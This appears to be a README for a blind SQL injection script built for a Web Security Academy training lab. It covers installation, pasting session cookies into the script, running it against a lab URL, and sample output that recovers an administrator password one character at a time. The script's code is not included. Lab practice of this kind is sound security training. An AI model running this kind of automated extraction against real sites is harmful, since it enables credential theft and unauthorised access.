## 📦 Prerequisites

Install the required dependencies before running the script:

```bash
pip install beautifulsoup4 requests
'''

Copy your active TrackingId and session cookies and update them in blindsql.py.

Running it is easy, just run the command and the url as parameter

Example
-> python3 blindsql.py https://0a75002a037a3ec180752bc8009e0061.web-security-academy.net/

It will test the password for administrator in under a minute!

[+] Retrieving administrator password.......
[+] Starting extraction using 15 threads...

[+] Found position 01: b  -->  Current Password: b
[+] Found position 02: y  -->  Current Password: by
[+] Found position 03: i  -->  Current Password: byi
[+] Found position 04: z  -->  Current Password: byiz
[+] Found position 05: a  -->  Current Password: byiza
[+] Found position 06: n  -->  Current Password: byizan
[+] Found position 07: j  -->  Current Password: byizanj
[+] Found position 08: n  -->  Current Password: byizanjn
[+] Found position 09: d  -->  Current Password: byizanjnd
[+] Found position 10: a  -->  Current Password: byizanjnda
[+] Found position 11: m  -->  Current Password: byizanjndam
[+] Found position 12: c  -->  Current Password: byizanjndamc
[+] Found position 13: a  -->  Current Password: byizanjndamca
[+] Found position 14: z  -->  Current Password: byizanjndamcaz
[+] Found position 15: 0  -->  Current Password: byizanjndamcaz0
[+] Found position 16: 0  -->  Current Password: byizanjndamcaz00
[+] Found position 17: i  -->  Current Password: byizanjndamcaz00i
[+] Found position 18: b  -->  Current Password: byizanjndamcaz00ib
[+] Found position 19: x  -->  Current Password: byizanjndamcaz00ibx
[+] Found position 20: u  -->  Current Password: byizanjndamcaz00ibxu

[+] Final Password: byizanjndamcaz00ibxu
